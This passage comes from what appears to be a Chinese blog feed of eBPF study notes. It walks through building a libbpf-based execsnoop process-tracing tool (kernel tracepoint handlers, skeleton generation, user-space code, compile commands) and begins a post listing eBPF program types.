class-name">trace_event_raw_sys_enter</span>                       <span class="token operator">*</span>ctx<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">struct</span> <span class="token class-name">event</span> <span class="token operator">*</span>event<span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>args <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>ctx<span class="token operator">-></span>args<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>argp<span class="token punctuation">;</span>    <span class="token comment">// 查询PID</span>    u64 id <span class="token operator">=</span> <span class="token function">bpf_get_current_pid_tgid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">pid_t</span> pid <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">pid_t</span><span class="token punctuation">)</span> id<span class="token punctuation">;</span>    <span class="token comment">// 保存一个空的event到哈希映射中</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">bpf_map_update_elem</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>execs<span class="token punctuation">,</span> <span class="token operator">&amp;</span>pid<span class="token punctuation">,</span> <span class="token operator">&amp;</span>empty_event<span class="token punctuation">,</span> BPF_NOEXIST<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    event <span class="token operator">=</span> <span class="token function">bpf_map_lookup_elem</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>execs<span class="token punctuation">,</span> <span class="token operator">&amp;</span>pid<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>event<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// 初始化event变量</span>    event<span class="token operator">-></span>pid <span class="token operator">=</span> pid<span class="token punctuation">;</span>    event<span class="token operator">-></span>args_count <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    event<span class="token operator">-></span>args_size <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token comment">// 查询第一个参数</span>    <span class="token keyword">unsigned</span> <span class="token keyword">int</span> ret <span class="token operator">=</span> <span class="token function">bpf_probe_read_user_str</span><span class="token punctuation">(</span>event<span class="token operator">-></span>args<span class="token punctuation">,</span> ARGSIZE<span class="token punctuation">,</span>                           <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>ctx<span class="token operator">-></span>args<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>ret <span class="token operator">&lt;=</span> ARGSIZE<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        event<span class="token operator">-></span>args_size <span class="token operator">+=</span> ret<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// 查询其他参数</span>    event<span class="token operator">-></span>args_count<span class="token operator">++</span><span class="token punctuation">;</span>    <span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">pragma</span> <span class="token expression"><span class="token function">unrollfor</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> TOTAL_MAX_ARGS<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></span></span>        <span class="token function">bpf_probe_read_user</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>argp<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>argp<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>args<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>argp<span class="token punctuation">)</span>            <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>event<span class="token operator">-></span>args_size <span class="token operator">></span> LAST_ARG<span class="token punctuation">)</span>            <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>        ret <span class="token operator">=</span>            <span class="token function">bpf_probe_read_user_str</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>event<span class="token operator">-></span>args<span class="token punctuation">[</span>event<span class="token operator">-></span>args_size<span class="token punctuation">]</span><span class="token punctuation">,</span>                        ARGSIZE<span class="token punctuation">,</span> argp<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>ret <span class="token operator">></span> ARGSIZE<span class="token punctuation">)</span>            <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>        event<span class="token operator">-></span>args_count<span class="token operator">++</span><span class="token punctuation">;</span>        event<span class="token operator">-></span>args_size <span class="token operator">+=</span> ret<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// 再尝试一次，确认是否还有未读取的参数</span>    <span class="token function">bpf_probe_read_user</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>argp<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>argp<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>args<span class="token punctuation">[</span>TOTAL_MAX_ARGS<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>argp<span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token comment">// 如果还有未读取参数，则增加参数数量（用于输出"..."）</span>    event<span class="token operator">-></span>args_count<span class="token operator">++</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>其中，你需要注意这三点：</p><ul><li>第一，程序使用了 <code>bpf_probe_read_user()</code>  来查询参数。由于它把 <code>\0</code>  也算到了已读取参数的长度里面，所以最终 <code>event-&gt;args</code> 中保存的各个参数是以 <code>\0</code>  分隔的。在用户态程序输出参数之前，需要用空格替换  <code>\0</code>。</li><li>第二，程序在一开始的时候向哈希映射存入了一个空事件，在后续出口跟踪点处理的时候需要确保空事件也能正确清理。</li><li>第三，程序在最后又尝试多读取了一次参数列表。如果还有未读取参数，参数数量增加了 1。用户态程序可以根据参数数量来决定是不是需要在参数结尾输出一个 <code>...</code>。</li></ul><h3 id="出口跟踪点处理-1"><a href="#出口跟踪点处理-1" class="headerlink" title="出口跟踪点处理"></a>出口跟踪点处理</h3><p>入口跟踪点处理好之后，再来看看出口跟踪点的处理方法。它的步骤跟 BCC 程序也是类似的，也是查询进程基本信息、填充返回值、提交到性能事件映射这三个步骤。</p><p>除此之外，由于刚才入口跟踪点的处理中没有读取进程名称，所以在提交性能事件之前还需要先查询一下进程名称。完整的程序如下所示，具体每一步的内容我也加了详细的注释：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token function">SEC</span><span class="token punctuation">(</span><span class="token string">"tracepoint/syscalls/sys_exit_execve"</span><span class="token punctuation">)</span><span class="token keyword">int</span> <span class="token function">tracepoint__syscalls__sys_exit_execve</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">trace_event_raw_sys_exit</span> <span class="token operator">*</span>ctx<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    u64 id<span class="token punctuation">;</span>    <span class="token class-name">pid_t</span> pid<span class="token punctuation">;</span>    <span class="token keyword">int</span> ret<span class="token punctuation">;</span>    <span class="token keyword">struct</span> <span class="token class-name">event</span> <span class="token operator">*</span>event<span class="token punctuation">;</span>    <span class="token comment">// 从哈希映射中查询进程基本信息</span>    id <span class="token operator">=</span> <span class="token function">bpf_get_current_pid_tgid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    pid <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">pid_t</span><span class="token punctuation">)</span> id<span class="token punctuation">;</span>    event <span class="token operator">=</span> <span class="token function">bpf_map_lookup_elem</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>execs<span class="token punctuation">,</span> <span class="token operator">&amp;</span>pid<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>event<span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token comment">// 更新返回值和进程名称</span>    ret <span class="token operator">=</span> ctx<span class="token operator">-></span>ret<span class="token punctuation">;</span>    event<span class="token operator">-></span>retval <span class="token operator">=</span> ret<span class="token punctuation">;</span>    <span class="token function">bpf_get_current_comm</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>event<span class="token operator">-></span>comm<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>event<span class="token operator">-></span>comm<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 提交性能事件</span>    <span class="token class-name">size_t</span> len <span class="token operator">=</span> <span class="token function">EVENT_SIZE</span><span class="token punctuation">(</span>event<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>len <span class="token operator">&lt;=</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token operator">*</span>event<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token function">bpf_perf_event_output</span><span class="token punctuation">(</span>ctx<span class="token punctuation">,</span> <span class="token operator">&amp;</span>events<span class="token punctuation">,</span> BPF_F_CURRENT_CPU<span class="token punctuation">,</span> event<span class="token punctuation">,</span>                      len<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 清理哈希映射</span>    <span class="token function">bpf_map_delete_elem</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>execs<span class="token punctuation">,</span> <span class="token operator">&amp;</span>pid<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>从这些代码中你可以看到，它的处理逻辑跟上述的 BCC 程序基本上是相同的。不过，详细对比一下，你会发现它们之间还是有不同的，不同点主要在两个方面：</p><ul><li>第一，函数名的定义格式不同。BCC 程序使用的是 <code>TRACEPOINT_PROBE</code> 宏，而 libbpf 程序用的则是  <code>SEC</code>  宏。</li><li>第二，映射的访问方法不同。BCC 封装了很多更易用的映射访问函数（如 <code>tasks.lookup()</code>），而 libbpf 程序则需要调用 05 讲 提到过的 BPF 辅助函数（比如查询要使用 <code>bpf_map_lookup_elem()</code>）。</li></ul><p>到这里，新建一个目录，并把上述代码存入 <code>execsnoop.bpf.c</code> 文件中，eBPF 部分的代码也就开发好了。</p><h3 id="编译并生成脚手架头文件"><a href="#编译并生成脚手架头文件" class="headerlink" title="编译并生成脚手架头文件"></a>编译并生成脚手架头文件</h3><p>有了 eBPF 程序，执行下面的命令，你就可以使用 clang 和 bpftool 将其编译成 BPF 字节码，然后再生成其脚手架头文件  <code>execsnoop.skel.h</code> （注意，脚手架头文件的名字一般定义为  <code>&lt;程序名&gt;.skel.h</code>）：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">clang <span class="token parameter variable">-g</span> <span class="token parameter variable">-O2</span> <span class="token parameter variable">-target</span> bpf <span class="token parameter variable">-D__TARGET_ARCH_x86_64</span> -I/usr/include/x86_64-linux-gnu -I. <span class="token parameter variable">-c</span> execsnoop.bpf.c <span class="token parameter variable">-o</span> execsnoop.bpf.obpftool gen skeleton execsnoop.bpf.o <span class="token operator">></span> execsnoop.skel.h<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>其中，clang 的参数 <code>-target bpf</code>  表示要生成 BPF 字节码，<code>-D__TARGET_ARCH_x86_64</code>  表示目标的体系结构是 <code>x86_64</code>，而  <code>-I</code>  则是引入头文件路径。</p><p>命令执行后，脚手架头文件会放到 <code>execsnoop.skel.h</code>  中，这个头文件包含了 BPF 字节码和相关的管理函数。因而，当用户态程序引入这个头文件并编译之后，只需要分发最终用户态程序生成的二进制文件到生产环境即可（如果用户态程序使用了其他的动态库，还需要分发动态库）。</p><h3 id="开发用户态程序"><a href="#开发用户态程序" class="headerlink" title="开发用户态程序"></a>开发用户态程序</h3><p>有了脚手架头文件之后，还剩下最后一步，也就是用户态程序的开发。</p><p>同 BCC 的 Python 前端程序类似，libbpf 用户态程序也需要 eBPF 程序加载、挂载到跟踪点，以及通过 BPF 映射获取和打印执行结果等几个步骤。虽然 C 语言听起来可能比 Python 语言麻烦一些，但实际上，这几个步骤都可以通过脚手架头文件中自动生成的函数来完成。</p><p>下面是忽略了错误处理逻辑之后，用户态程序的一个基本框架：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">// 引入脚手架头文件</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"execsnoop.skel.h"</span></span><span class="token comment">// C语言主函数</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token comment">// 定义BPF程序和性能事件缓冲区</span>    <span class="token keyword">struct</span> <span class="token class-name">execsnoop_bpf</span> <span class="token operator">*</span>skel<span class="token punctuation">;</span>    <span class="token keyword">struct</span> <span class="token class-name">perf_buffer_opts</span> pb_opts<span class="token punctuation">;</span>    <span class="token keyword">struct</span> <span class="token class-name">perf_buffer</span> <span class="token operator">*</span>pb <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> err<span class="token punctuation">;</span>    <span class="token comment">// 1. 设置调试输出函数</span>    <span class="token function">libbpf_set_print</span><span class="token punctuation">(</span>libbpf_print_fn<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 2. 增大 RLIMIT_MEMLOCK（默认值通常太小，不足以存入BPF映射的内容）</span>    <span class="token function">bump_memlock_rlimit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 3. 初始化BPF程序</span>    skel <span class="token operator">=</span> <span class="token function">execsnoop_bpf__open</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 4. 加载BPF字节码</span>    err <span class="token operator">=</span> <span class="token function">execsnoop_bpf__load</span><span class="token punctuation">(</span>skel<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 5. 挂载BPF字节码到跟踪点</span>    err <span class="token operator">=</span> <span class="token function">execsnoop_bpf__attach</span><span class="token punctuation">(</span>skel<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 6. 配置性能事件回调函数</span>    pb_opts<span class="token punctuation">.</span>sample_cb <span class="token operator">=</span> handle_event<span class="token punctuation">;</span>    pb <span class="token operator">=</span> <span class="token function">perf_buffer__new</span><span class="token punctuation">(</span><span class="token function">bpf_map__fd</span><span class="token punctuation">(</span>skel<span class="token operator">-></span>maps<span class="token punctuation">.</span>events<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">64</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>pb_opts<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 7. 从缓冲区中循环读取数据</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>err <span class="token operator">=</span> <span class="token function">perf_buffer__poll</span><span class="token punctuation">(</span>pb<span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>其中，<code>execsnoop_</code>  开头的数据结构和函数都包含在脚手架头文件 <code>execsnoop.skel.h</code> 中。而具体到每一步的含义如下：</p><ul><li>第 1 步的调试输出函数中，可以调用 <code>printf()</code> 把调试信息输出到终端中。</li><li>第 2 步增大锁定内存限制 <code>RLIMIT_MEMLOCK</code> 是必要的，因为系统默认的锁定内存通常过小，无法满足 BPF 映射的需要。</li><li>第 3~5 步，直接调用脚手架头文件中的函数，加载 BPF 字节码并挂载到跟踪点。</li><li>第 6~7 步为性能事件设置回调函数，并从缓冲区中循环读取数据。注意，性能事件映射  <code>skel-&gt;maps.events</code>  也是 bpftool 自动帮你生成好的。</li></ul><p>接下来，在性能事件回调函数中，把数据格式转换为 <code>struct event</code>  格式之后，由于参数列表是使用  <code>\0</code>  来分割的，并不能直接向终端打印所有参数。所以，还需要把  <code>\0</code>  先替换为空格，然后再打印。完整的回调函数如下所示：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">// 性能事件回调函数(向终端中打印进程名、PID、返回值以及参数)</span><span class="token keyword">void</span> <span class="token function">handle_event</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span>ctx<span class="token punctuation">,</span> <span class="token keyword">int</span> cpu<span class="token punctuation">,</span> <span class="token keyword">void</span> <span class="token operator">*</span>data<span class="token punctuation">,</span> __u32 data_sz<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">const</span> <span class="token keyword">struct</span> <span class="token class-name">event</span> <span class="token operator">*</span>e <span class="token operator">=</span> data<span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%-16s %-6d %3d "</span><span class="token punctuation">,</span> e<span class="token operator">-></span>comm<span class="token punctuation">,</span> e<span class="token operator">-></span>pid<span class="token punctuation">,</span> e<span class="token operator">-></span>retval<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">print_args</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">putchar</span><span class="token punctuation">(</span><span class="token char">'\n'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// 打印参数（替换'\0'为空格）</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">print_args</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">struct</span> <span class="token class-name">event</span> <span class="token operator">*</span>e<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> args_counter <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> e<span class="token operator">-></span>args_size <span class="token operator">&amp;&amp;</span> args_counter <span class="token operator">&lt;</span> e<span class="token operator">-></span>args_count<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">char</span> c <span class="token operator">=</span> e<span class="token operator">-></span>args<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>c <span class="token operator">==</span> <span class="token char">'\0'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token comment">// 把'\0'替换为空格</span>            args_counter<span class="token operator">++</span><span class="token punctuation">;</span>            <span class="token function">putchar</span><span class="token punctuation">(</span><span class="token char">' '</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token function">putchar</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>e<span class="token operator">-></span>args_count <span class="token operator">></span> TOTAL_MAX_ARGS<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// 过长的参数输出"..."替代</span>        <span class="token function">fputs</span><span class="token punctuation">(</span><span class="token string">" ..."</span><span class="token punctuation">,</span> <span class="token constant">stdout</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>把上面的代码保存到  <code>execsnoop.c</code>  文件中，然后执行下面的命令，将其编译为可执行文件：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">clang <span class="token parameter variable">-g</span> <span class="token parameter variable">-O2</span> <span class="token parameter variable">-Wall</span> <span class="token parameter variable">-I</span> <span class="token builtin class-name">.</span> <span class="token parameter variable">-c</span> execsnoop.c <span class="token parameter variable">-o</span> execsnoop.oclang <span class="token parameter variable">-Wall</span> <span class="token parameter variable">-O2</span> <span class="token parameter variable">-g</span> execsnoop.o <span class="token parameter variable">-static</span> <span class="token parameter variable">-lbpf</span> <span class="token parameter variable">-lelf</span> <span class="token parameter variable">-lz</span> <span class="token parameter variable">-o</span> execsnoop<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>最后，执行 <code>execsnoop</code>，你就可以得到如下的结果：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">sudo</span> ./execsnoopCOMM             PID    RET ARGS<span class="token function">sh</span>               <span class="token number">276871</span>   <span class="token number">0</span> /bin/sh <span class="token parameter variable">-c</span> <span class="token function">which</span> <span class="token function">ps</span><span class="token function">which</span>            <span class="token number">276872</span>   <span class="token number">0</span> /usr/bin/which <span class="token function">ps</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>你还可以直接把这个文件复制到开启了 BTF 的其他机器中，无需安装额外的 LLVM 开发工具和内核头文件，也可以直接执行。</p><p>如果命令失败，并且你看到如下的错误，这说明当前机器没有开启 BTF，需要重新编译内核开启 BTF 才可以运行：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Failed to load and verify BPF skeleton<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>虽然这三种方法的步骤和实现代码各不相同，但实际上它们的实现逻辑都是类似的，无非就是找出跟踪点，然后在 eBPF 部分获取想要的数据并保存到 BPF 映射中，最后在用户空间程序中读取 BPF 映射的内容并输出出来。</p></blockquote><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>在实际的应用中，这三种方法有不同的使用场景：</p><ul><li>bpftrace 通常用在<strong>快速排查和定位系统</strong>上，它支持用单行脚本的方式来快速开发并执行一个 eBPF 程序；</li><li>BCC 通常用在<strong>开发复杂的 eBPF 程序</strong>中，它内置的各种小工具也是目前应用最为广泛的 eBPF 小程序；</li><li>libbpf 是<strong>从内核中抽离出来的标准库</strong>，用它开发的 eBPF 程序可以直接分发执行，不再需要在每台机器上都安装 LLVM 和内核头文件。</li></ul><p>通常情况下，你可以用 bpftrace 或 BCC 做一些快速原型，验证你的设计思路是不是可行，然后再切换到 libbpf ，开发完善的 eBPF 程序后再去分发执行。这样，不仅 eBPF 程序运行得更快（无需编译步骤），还避免了在运行环境中安装开发工具和内核头文件。</p><p>在不支持 BTF 的机器中，如果不想在运行 eBPF 时依赖于 LLVM 编译和内核头文件，你还可以参考内核中的  BPF 示例，直接引用内核源码中的 <code>tools/lib/bpf/</code>  库，以及内核头文件中的数据结构，来开发 eBPF 程序。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;eBPF 内核跟踪，eBPF 学习（四）&lt;/p&gt;</summary>
    
    
    
    <category term="eBPF" scheme="https://drun1baby.github.io/categories/eBPF/"/>
    
    
    <category term="eBPF" scheme="https://drun1baby.github.io/tags/eBPF/"/>
    
  </entry>
  
  <entry>
    <title>eBPF 程序的触发机制及其应用场景</title>
    <link href="https://drun1baby.github.io/2023/08/06/eBPF-%E7%A8%8B%E5%BA%8F%E7%9A%84%E8%A7%A6%E5%8F%91%E6%9C%BA%E5%88%B6%E5%8F%8A%E5%85%B6%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF/"/>
    <id>https://drun1baby.github.io/2023/08/06/eBPF-%E7%A8%8B%E5%BA%8F%E7%9A%84%E8%A7%A6%E5%8F%91%E6%9C%BA%E5%88%B6%E5%8F%8A%E5%85%B6%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF/</id>
    <published>2023-08-06T05:53:33.000Z</published>
    <updated>2023-08-09T02:23:05.088Z</updated>
    
    <content type="html"><![CDATA[<p>各类 eBPF 程序的触发机制及其应用场景，eBPF 学习（三）</p><span id="more"></span><h1 id="各类-eBPF-程序的触发机制及其应用场景"><a href="#各类-eBPF-程序的触发机制及其应用场景" class="headerlink" title="各类 eBPF 程序的触发机制及其应用场景"></a>各类 eBPF 程序的触发机制及其应用场景</h1><p>在上一讲中曾也提到，并不是所有的辅助函数都可以在 eBPF 程序中随意使用，不同类型的 eBPF 程序所支持的辅助函数是不同的。</p><p>那么，eBPF 程序都有哪些类型，而不同类型的 eBPF 程序又有哪些独特的应用场景呢？今天，就一起来看看。</p><h2 id="几类-eBPF-程序"><a href="#几类-eBPF-程序" class="headerlink" title="几类 eBPF 程序"></a>几类 eBPF 程序</h2><p>eBPF 程序类型决定了一个 eBPF 程序可以挂载的事件类型和事件参数，这也就意味着，内核中不同事件会触发不同类型的 eBPF 程序。</p><p>根据内核头文件 <a class="link"   href="https://elixir.bootlin.com/linux/v5.13/source/include/uapi/linux/bpf.h#L908" >include&#x2F;uapi&#x2F;linux&#x2F;bpf.h<i class="fas fa-external-link-alt"></i></a> 中  bpf_prog_type 的定义，Linux 内核 v5.13 已经支持 30 种不同类型的 eBPF 程序（注意， <code>BPF_PROG_TYPE_UNSPEC</code> 表示未定义）：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">enum</span> <span class="token class-name">bpf_prog_type</span> <span class="token punctuation">&#123;</span>  BPF_PROG_TYPE_UNSPEC<span class="token punctuation">,</span> <span class="token comment">/* Reserve 0 as invalid program type */</span>  BPF_PROG_TYPE_SOCKET_FILTER<span class="token punctuation">,</span>  BPF_PROG_TYPE_KPROBE<span class="token punctuation">,</span>  BPF_PROG_TYPE_SCHED_CLS<span class="token punctuation">,</span>  BPF_PROG_TYPE_SCHED_ACT<span class="token punctuation">,</span>  BPF_PROG_TYPE_TRACEPOINT<span class="token punctuation">,</span>  BPF_PROG_TYPE_XDP<span class="token punctuation">,</span>  BPF_PROG_TYPE_PERF_EVENT<span class="token punctuation">,</span>  BPF_PROG_TYPE_CGROUP_SKB<span class="token punctuation">,</span>  BPF_PROG_TYPE_CGROUP_SOCK<span class="token punctuation">,</span>  BPF_PROG_TYPE_LWT_IN<span class="token punctuation">,</span>  BPF_PROG_TYPE_LWT_OUT<span class="token punctuation">,</span>  BPF_PROG_TYPE_LWT_XMIT<span class="token punctuation">,</span>  BPF_PROG_TYPE_SOCK_OPS<span class="token punctuation">,</span>  BPF_PROG_TYPE_SK_SKB<span class="token punctuation">,</span>  BPF_PROG_TYPE_CGROUP_DEVICE<span class="token punctuation">,</span>  BPF_PROG_TYPE_SK_MSG<span class="token punctuation">,</span>  BPF_PROG_TYPE_RAW_TRACEPOINT<span class="token punctuation">,</span>  BPF_PROG_TYPE_CGROUP_SOCK_ADDR<span class="token punctuation">,</span>  BPF_PROG_TYPE_LWT_SEG6LOCAL<span class="token punctuation">,</span>  BPF_PROG_TYPE_LIRC_MODE2<span class="token punctuation">,</span>  BPF_PROG_TYPE_SK_REUSEPORT<span class="token punctuation">,</span>  